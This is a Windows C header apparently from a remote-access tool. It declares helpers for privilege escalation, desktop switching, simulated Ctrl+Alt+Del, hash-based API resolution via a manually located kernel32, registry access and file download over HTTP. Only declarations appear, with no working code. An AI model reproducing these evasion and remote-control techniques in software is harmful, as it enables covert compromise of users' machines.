#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED


typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
  LPDWORD lpThreadId, bool bInteractive = false);
	

DWORD GetProcessID(LPCTSTR lpProcessName);
BOOL DebugPrivilege(const char* PName, BOOL bEnable);
bool SwitchInputDesktop();
int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, char* szData, LPBYTE szBytes, DWORD lbSize, int Mode);
int WriteRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, char* szData, DWORD dwData, int Mode);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL SimulateCtrlAltDel();
BOOL MyStrcmp(DWORD str1, char* str2);
DWORD GetProcHash(char* lpProcName);
HMODULE GetKernel32Base();
DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName);
FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
bool http_get(LPCTSTR szURL, LPCTSTR szFileName);
#endif // !defined(AFX_UNTIL_H_INCLUDED)